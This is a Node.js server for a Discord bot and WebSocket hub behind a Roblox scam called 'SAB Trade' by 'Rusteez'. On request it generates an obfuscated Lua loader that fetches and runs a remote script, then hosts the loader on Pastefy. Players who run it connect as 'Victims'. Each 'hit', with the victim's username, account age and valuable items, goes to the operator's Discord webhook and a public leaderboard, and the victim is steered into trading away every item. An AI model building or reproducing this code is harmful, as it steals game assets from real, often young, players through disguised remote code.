const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');
const luamin = require('luamin');
const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
const { v4: uuidv4 } = require('uuid');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags } = require('discord.js');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const axios = require('axios');
const { PastefyClient } = require('@interaapps/pastefy');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
const pastefy = new PastefyClient(process.env.PASTEFY_KEY);

async function uploadToPastefy(code, webhookId) {
    try {
        log("☁️ [PASTEFY] Creating paste via Official SDK...");

        // Utilisation simplifiée du SDK
        const paste = await pastefy.createPaste({
            title: `SABTrade`,
            content: code,
            visibility: 'PUBLIC' // Utilise 'UNLISTED' ou 'PUBLIC' selon tes besoins
        });

        if (paste && paste.id) {
            const rawUrl = `https://pastefy.app/${paste.id}/raw`;
            log(`✅ [PASTEFY] Success! ID: ${paste.id}`);
            return rawUrl;
        }
        
        return null;
    } catch (error) {
        log(`❌ [PASTEFY ERROR] ${error.message}`);
        return null;
    }
}

async function obfuscateScript(luaCode) {
    try {
        log("🔍 [OBF] Requesting WeAreDevs Obfuscator...");

        const response = await axios.post('https://wearedevs.net/api/obfuscate', 
        {
            script: luaCode
        }, 
        {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/json',
                'cookie': process.env.WRD_COOKIE, // Ta variable sur Render
                'Referer': 'https://wearedevs.net/obfuscator',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
            }
        });

        // On vérifie le succès selon le format que tu as reçu
        if (response.data && response.data.success) {
            log("✅ [OBF] WeAreDevs Success!");
            return response.data.obfuscated; // C'est ici que se trouve le code
        }

        log("⚠️ [OBF] Failed: " + (response.data.message || "Unknown error"));
        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.message}`);
        return null;
    }
}
async function obfuscateScriptv2(luaCode) {
    try {
        log("🔍 [OBF] Step 1: Creating Session...");

        // ÉTAPE 1 : Créer la session avec le code source
        const sessionResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/newscript', 
            luaCode, // Le code est envoyé directement comme texte
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'content-type': 'text/plain' // La doc dit 'text'
                }
            }
        );

        const sessionId = sessionResponse.data.sessionId;
        if (!sessionId) throw new Error("No Session ID returned");

        log(`🔍 [OBF] Step 2: Applying Obfuscation (Session: ${sessionId.substring(0, 8)}...)`);

        // ÉTAPE 2 : Appliquer les plugins d'obfuscation
        const obfResponse = await axios.post('https://api.luaobfuscator.com/v1/obfuscator/obfuscate', 
            {
                "MinifiyAll": true,
                "CustomPlugins": {
                    "EncryptStrings": [100],      // 100% des strings chiffrées
                    "ControlFlowFlattenV1AllBlocks": [100], // Flux mélangé
                    "SwizzleLookups": [100]        // foo.bar -> foo['bar']
                }
            }, 
            {
                headers: {
                    'apikey': process.env.LUA_OBF_KEY,
                    'sessionId': sessionId,
                    'content-type': 'application/json'
                }
            }
        );

        if (obfResponse.data && obfResponse.data.code) {
            log(`✅ [OBF] Success! Final code received.`);
            return obfResponse.data.code;
        }

        return null;

    } catch (error) {
        log(`❌ [OBF ERROR] ${error.response?.data?.message || error.message}`);
        return null;
    }
}

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const hitEventSchema = new mongoose.Schema({
    userId: { type: String, required: true },     // Discord ID
    userName: { type: String, required: true },   // Nom d'utilisateur
    timestamp: { type: Date, default: Date.now }  // Date précise du hit
});

const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    userId: {
        type: String,
        required: true,
        trim: true
    },
    userName: { type: String, required: true }
}, {
    timestamps: true
});

// Create an index for faster date-based queries
hitEventSchema.index({ timestamp: -1 });

const HitEvent = mongoose.model('HitEvent', hitEventSchema);
const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


// --- BOT DISCORD ---
const clientDiscord = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

const commands = [
    // Generate Command
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate a customized SAB Trade script')
        .addStringOption(option => 
            option.setName('username').setDescription('Roblox usernames separated by commas').setRequired(true))
        .addStringOption(option => 
            option.setName('webhook').setDescription('Your Discord Webhook URL').setRequired(true))
        .addIntegerOption(option => 
            option.setName('income').setDescription('Minimum income threshold (e.g., 10000000)').setRequired(true))
        .addStringOption(option => 
            option.setName('visual').setDescription('Custom URL for the visual interface (Optional)').setRequired(false)),

    // Leaderboard Command
    new SlashCommandBuilder()
        .setName('leaderboard')
        .setDescription('Display the top hit contributors')
        .addStringOption(option =>
            option.setName('type')
                .setDescription('Select the timeframe for the leaderboard')
                .setRequired(true)
                .addChoices(
                    { name: 'Daily', value: 'daily' },
                    { name: 'Weekly', value: 'weekly' },
                    { name: 'Monthly', value: 'monthly' },
                    { name: 'All Time', value: 'alltime' }
                )),

    // Total Hits Command
    new SlashCommandBuilder()
        .setName('totalhits')
        .setDescription('View your personal hit statistics and global rank')

].map(cmd => cmd.toJSON());

clientDiscord.once(Events.ClientReady, async () => {
    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes slash enregistrées');
    } catch (error) {
        log(`❌ Erreur Slash Commands: ${error}`);
    }
});

clientDiscord.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName === 'totalhits') {
        const userId = interaction.user.id;
    
        // Calcul du total
        const totalHits = await HitEvent.countDocuments({ userId });
    
        // Calcul du rang (All-time)
        const aggregateRank = await HitEvent.aggregate([
            { $group: { _id: "$userId", count: { $sum: 1 } } },
            { $sort: { count: -1 } }
        ]);
        const rank = aggregateRank.findIndex(u => u._id === userId) + 1;
    
        const statsEmbed = new EmbedBuilder()
            .setTitle("📊 Your Hit Stats")
            .setColor(0x5865F2)
            .addFields(
                { name: "Total hits", value: `**${totalHits}**`, inline: false },
                { name: "Your rank (all-time)", value: `#${rank || "N/A"}`, inline: false }
            )
            .setFooter({ text: `Rusteez Script` });
    
        await interaction.reply({ embeds: [statsEmbed], flags: [MessageFlags.Ephemeral] });
    }
    if (interaction.commandName === 'leaderboard') {
        const type = interaction.options.getString('type'); // "daily", "weekly", etc.
        let dateFilter = {};
    
        // Définition de la période
        const now = new Date();
        if (type === 'daily') dateFilter = { timestamp: { $gte: new Date(now.setHours(0,0,0,0)) } };
        else if (type === 'weekly') dateFilter = { timestamp: { $gte: new Date(now.setDate(now.getDate() - 7)) } };
        else if (type === 'monthly') dateFilter = { timestamp: { $gte: new Date(now.setMonth(now.getMonth() - 1)) } };
    
        // Agrégation des données
        const topUsers = await HitEvent.aggregate([
            { $match: dateFilter },
            // ICI : change "username" en "userName" pour correspondre à ton schéma
            { $group: { _id: "$userId", userName: { $first: "$userName" }, hits: { $sum: 1 } } }, 
            { $sort: { hits: -1 } },
            { $limit: 10 }
        ]);
    
        let description = topUsers.map((user, i) => {
            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `${i + 1}.`;
            // ICI : assure-toi que c'est bien user.userName
            return `${medal} **@${user.userName}** — **${user.hits}** hits`;
        }).join('\n');
    
        const lbEmbed = new EmbedBuilder()
            .setTitle(`${type.charAt(0).toUpperCase() + type.slice(1)} Hitcount`)
            .setColor(0xFFAA00)
            .setDescription(`Top 10 users (${type})\n\n${description || "Aucune donnée"}`)
            .setFooter({ text: "Rusteez Scripts • Aujourd'hui" });
    
        await interaction.reply({ embeds: [lbEmbed] });
    }
    if (interaction.commandName === 'generate-sab-trade') {
        // 1. On prévient Discord qu'on travaille (indispensable pour éviter le timeout)
        try {
            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
        } catch (err) {
            console.error("❌ Erreur deferReply:", err);
            return;
        }

        try {
            const usernames = interaction.options.getString('username');
            const webhookUrl = interaction.options.getString('webhook');
            const income = interaction.options.getInteger('income');
            const visual = interaction.options.getString('visual') || "";
            const userId = interaction.user.id;
            const userName = interaction.user.username;
            // Génération de l'ID unique pour la base de données
            const webhookUuid = generateWebhookId();

            // 2. Sauvegarde en Base de données (MongoDB)
            const newWebhookEntry = new WebHookId({
                webhookId: webhookUuid,
                url: webhookUrl,
                userId: userId,
                userName: userName
            });
            await newWebhookEntry.save();
            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.username}`);

            // 3. Préparation du Code Source Lua
            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
            const codeToObfuscate = `local fenv = getfenv()
fenv["Receivers"] = { ${userArrayLua} }
fenv["WebHook"] = "${webhookUuid}"
fenv["Visual"] = "${visual}"
fenv["MinIncome"] = ${income}
loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyScripts/refs/heads/main/Trade.lua"))()`;

            // 4. Obfuscation via WeAreDevs (Utilise tes cookies configurés sur Render)
            const obfuscated = await obfuscateScript(codeToObfuscate);

            if (!obfuscated) {
                return await interaction.editReply("❌ Obfuscation failed (WeAreDevs). Please check server logs.");
            }

            // 5. Upload sur Pastefy (Utilise ta PASTEFY_KEY)
            const pasteUrl = await uploadToPastefy(obfuscated, webhookUuid);

            if (!pasteUrl) {
                return await interaction.editReply("⚠️ Obfuscation success, but Pastefy upload failed.");
            }

            // 6. Préparation du résultat final
            const finalLoadstring = `loadstring(game:HttpGet("${pasteUrl}", true))()`;
            
            const dmEmbed = new EmbedBuilder()
                .setTitle("🚀 SAB Trade Script Ready")
                .setColor(0x00FF00)
                .setDescription("Copy Your Code:")
                .addFields(
                    { name: "📜 Script Code", value: `\`\`\`lua\n${finalLoadstring}\n\`\`\`` }
                )
                .setFooter({ text: "SAB-Trade • System by Rusteez" })
                .setTimestamp();
            
            try {
                // 7. Tentative d'envoi en DM
                await interaction.user.send({ embeds: [dmEmbed] });
            
                // 8. Réponse éphémère de guidage
                await interaction.editReply({ 
                    content: `✅ **Script generated successfully!**\n\n> 📬 I've sent the execution code to your **Direct Messages (DMs)**.\n\n*If you don't see it, make sure your DMs are open.*` 
                });
            
            } catch (error) {
                // 9. Fallback si les DMs de l'utilisateur sont fermés
                log(`⚠️ [DM ERROR] DMs closed for ${interaction.user.tag}`);
                
                await interaction.editReply({ 
                    content: `⚠️ **Your DMs are closed!** I couldn't send the code privately.\n\nHere is your execution code:\n\`\`\`lua\n${finalLoadstring}\n\`\`\``
                });
            }

        } catch (error) {
            log(`❌ [CRITICAL ERROR] ${error.message}`);
            if (interaction.deferred) {
                await interaction.editReply(`❌ A server error occurred: ${error.message}`);
            }
        }
    }
});
if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).terminate();
        }
    
        activeVictims.set(username, ws);
        log(`🤖 Victim connecté : ${username}`);

        ws.on('close', () => {
            if (activeVictims.get(username) === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
            try {
                const data = JSON.parse(msg);
        
                if (data.Method === "Hit") {
                    const hitInfo = data.Hit;
                    const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
        
                    log(`🎯 Processing Hit from: ${hitInfo.Name}`);
        
                    // 1. Chercher le Webhook URL et l'Owner dans la DB
                    const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
        
                    if (!mapping) {
                        return log(`❌ Webhook ID ${webhookIdFromLua} not found in Database.`);
                    }
        
                    // 2. Incrémenter le Leaderboard (HitEvent)
                    const newHitEntry = new HitEvent({
                        userId: mapping.userId,     // On utilise l'ID Discord stocké à la création
                        userName: mapping.userName, // Le tag Discord
                        timestamp: new Date()
                    });
                    await newHitEntry.save();
                    log(`📈 Leaderboard updated for ${mapping.userName}`);
        
                    // 3. Préparer l'Embed pour Discord
                    const hitEmbed = new EmbedBuilder()
                    .setTitle("Rusteez • SAB Hit")
                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
                    .addFields(
                        { 
                            name: "📄 Player Information", 
                            value: `\`\`\`properties
                👤 Display Name : ${hitInfo.DisplayName}
                🆔 Username     : ${hitInfo.Name}
                🗓️ Account Age  : ${hitInfo.AccountAge} days
                📱 Executor     : Delta
                👥 Players      : ${hitInfo.Players}/8
                👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}
                \`\`\`` 
                        },
                        {
                            name: "👑 Valuable Brainrots",
                            value: `\`\`\`properties
                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
                    : "None"}
                \`\`\``
                        }
                    )
                    .setFooter({ text: `Rusteez Script ` });
                        
                    // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
                    try {
                        const webhookClient = new WebhookClient({ url: mapping.url });
                        await webhookClient.send({ 
                            content: hitInfo.Name,
                            embeds: [hitEmbed] 
                        });
                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
        
                    // 5. Envoi sur le Channel PUBLIC (public-hits)
                    const publicChannel = clientDiscord.channels.cache.get('1487370329776193677');
                    if (publicChannel) {
                        // On crée une version un peu plus "anonyme" ou stylée pour le public
                        const publicEmbed  = new EmbedBuilder()
                    .setTitle("Rusteez • SAB Hit")
                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
                    .addFields(
                        { 
                            name: "📄 Player Information", 
                            value: `\`\`\`properties
                👤 Display Name : ${hitInfo.DisplayName}
                🆔 Username     : ${hitInfo.Name}
                🗓️ Account Age  : ${hitInfo.AccountAge} days
                👥 Players      : ${hitInfo.Players}/8
                \`\`\`` 
                        },
                        {
                            name: "👑 Valuable Brainrots",
                            value: `\`\`\`properties
                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
                    : "None"}
                \`\`\``
                        }
                    )
                    .setFooter({ text: `Rusteez Script ` });
                        
                        publicChannel.send({ embeds: [publicEmbed] });
                    }
                }
            } catch (e) { 
                log(`⚠️ WS Message Error: ${e.message}`); 
            }
        });
      return; // On s'arrête ici pour les Victims
    }
    
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
